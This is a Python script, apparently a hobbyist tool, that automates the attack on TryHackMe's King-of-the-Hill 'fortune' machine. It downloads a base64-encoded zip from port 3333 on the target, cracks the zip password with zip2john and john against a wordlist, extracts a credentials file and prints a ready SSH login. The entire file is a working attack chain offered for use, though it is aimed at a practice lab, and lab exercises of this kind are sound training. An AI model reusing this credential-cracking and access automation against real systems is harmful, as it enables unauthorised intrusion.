# Developed By Kaali
# program to hack koth fortune machine of tryhackme

import subprocess
import base64

def first(ip):
    create_log_folder="mkdir log"
    create_folder_process=subprocess.run(create_log_folder, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    command1=f"wget http://{ip}:3333 -O ./log/base64.txt"
    process = subprocess.run(command1, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if process.returncode == 0:
        with open("./log/base64.txt",'r') as f:
            base=f.read()

        base64_file_string=base
        decode_file_data=base64.b64decode(base64_file_string)
        output_file_path="./log/application.zip"
        with open (output_file_path,"wb") as f:
            f.write(decode_file_data)
        print("\n ********** trying to hack the machine **********")
    else:
        print("Check IP Address or openVPN connection")
        first(ip)

def second(ip):

    command2=f"zip2john ./log/application.zip > ./log/hash.txt"
    process2=subprocess.run(command2, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if process2.returncode == 0:
        empty_john_history='echo " "> ~/.john/john.pot'
        empty_john_history_process=subprocess.run(empty_john_history, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        wordlist=input("Enter wordlist path(Recommended rockyou.txt) : ")
        command3=f"john ./log/hash.txt --wordlist={wordlist} >./log/passphrase.txt"
        process3=subprocess.run(command3, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if process3.returncode == 0:
            command4="cat ./log/passphrase.txt |grep '(application.zip/creds.txt)'|awk '{print $1}'>./log/zip_password.txt"
            process4=subprocess.run(command4, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if process4.returncode == 0:
                with open('./log/zip_password.txt', 'r') as file:
                    zip_password = file.read().strip()
                command5=f'unzip -P {zip_password} ./log/application.zip'
                process5=subprocess.run(command5, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if process5.returncode == 0:
                    with open('./creds.txt', 'r') as file:
                        creds = file.read().strip().split(':')
                        if len(creds) >= 2:
                            username, password = creds
                        print(f'''\n\nEnter this command \nssh -o StrictHostKeyChecking=no {username}@{ip}\n\nPassword: {password} ''')

                else:
                    print("********** something wrong contact to the developer or fix yourself **********")
            else:
                print("********** something wrong contact to the developer or fix yourself **********")    
        
        else:
            print("********** something wrong contact to the developer or fix yourself **********")   
    else:
        second(ip)
    

if __name__=="__main__":
    ip=input("Enter IP : ")
    username=""
    password=""
    try:
        first(ip)
        second(ip)
    except Exception as e:
        print(f"*\t\nError : {e}")

